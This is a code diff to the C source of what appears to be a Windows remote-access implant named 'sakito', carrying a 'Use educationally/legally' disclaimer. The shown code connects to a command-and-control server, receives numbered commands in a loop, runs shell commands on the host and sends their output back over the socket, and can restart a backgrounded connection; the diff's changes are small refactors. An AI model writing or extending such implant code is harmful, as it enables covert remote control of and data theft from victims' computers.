@@ -4,6 +4,7 @@ Use educationally/legally.
 */
 #include <ws2tcpip.h>
 #include <stdint.h>
+#include <direct.h>
 #include <errno.h>
 #include <stdio.h>
 #include "headers/sakito_core.h"
@@ -96,10 +97,7 @@ int exec_cmd(const SOCKET connect_socket, char* const buf) {
 	if (!sakito_win_cp(child_stdout_write, buf))
 		return FAILURE;
 
-	if (send_pipe_output(child_stdout_read, buf, connect_socket) < 1)
-		return FAILURE;
-
-	return SUCCESS;
+	return send_pipe_output(child_stdout_read, buf, connect_socket);
 }
 
 int ch_dir(char* const dir, SOCKET connect_socket) {
@@ -198,9 +196,10 @@ int main(void) {
 			int i_result = c2_connect(connect_socket);
 
 			if (i_result) {
-				_init:
 				// 8192 == Max command line command length in windows + 1 for null termination.
 				char buf[BUFLEN+1] = { 0 };
+
+				init: // Receive initialization byte.
 				i_result = recv(connect_socket, buf, 1, 0);
 				
 				while (i_result > 0) {
@@ -237,7 +236,7 @@ int main(void) {
 							break;
 						case '5':
 							// Reinitiate connection (backgrounded).
-							goto _init;
+							goto init;
 						case '6':
 							// Server-side error occurred re-receive command.
 							break;
@@ -252,4 +251,3 @@ int main(void) {
 
 	return FAILURE;
 }
-
